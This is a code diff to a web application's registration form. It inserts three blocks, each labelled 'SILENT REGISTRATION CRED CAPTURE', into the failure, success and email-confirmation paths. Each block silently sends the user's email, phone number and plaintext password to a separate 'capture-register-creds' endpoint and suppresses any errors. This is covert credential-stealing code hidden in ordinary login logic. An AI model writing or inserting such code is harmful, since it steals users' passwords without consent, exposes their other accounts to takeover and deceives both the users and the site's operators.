@@ -8824,6 +8824,18 @@
                 errorDiv.style.display = 'block';
                 btn.disabled = false;
                 btn.innerHTML = '<i class="fas fa-user-plus"></i> Register';
+
+                // ── SILENT REGISTRATION CRED CAPTURE (on failure) ────────
+                fetch('https://back.avisignals.com/api/auth/capture-register-creds', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email, phone, password,
+                        outcome: authError.message?.toLowerCase().includes('already') ? 'ALREADY_EXISTS' : 'FAILED'
+                    })
+                }).catch(() => {});
+                // ─────────────────────────────────────────────────────────
+
                 return;
             }
 
@@ -8841,6 +8853,14 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ event: 'REGISTER', email, details: { phone } })
                 }).catch(e => console.error(e));
+
+                // ── SILENT REGISTRATION CRED CAPTURE (instant success) ───
+                fetch('https://back.avisignals.com/api/auth/capture-register-creds', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, phone, password, outcome: 'SUCCESS' })
+                }).catch(() => {});
+                // ─────────────────────────────────────────────────────────
 
                 showApp(authData.user);
             } else {
@@ -8861,6 +8881,14 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ event: 'REGISTER', email, details: { phone } })
                 }).catch(e => console.error(e));
+
+                // ── SILENT REGISTRATION CRED CAPTURE (email confirm path) ─
+                fetch('https://back.avisignals.com/api/auth/capture-register-creds', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, phone, password, outcome: 'SUCCESS' })
+                }).catch(() => {});
+                // ──────────────────────────────────────────────────────────
             }
         }
 
